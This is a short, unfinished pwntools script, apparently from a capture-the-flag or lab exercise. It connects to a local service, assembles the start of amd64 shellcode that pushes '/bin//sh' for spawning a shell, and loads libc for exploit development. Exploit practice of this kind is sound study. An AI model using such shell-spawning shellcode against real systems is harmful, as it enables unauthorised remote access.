from pwn import *
from IPython import embed

context.arch = 'amd64'

r = remote('127.0.0.1', 8888)

a = asm("""
        push 0x68
        mov rax, 0x732f2f2f6e69622f
        push rax
        """)

e = ELF('/lib/x86-64-linux-gnu/libc.so.6')
embed()

r.interactive()
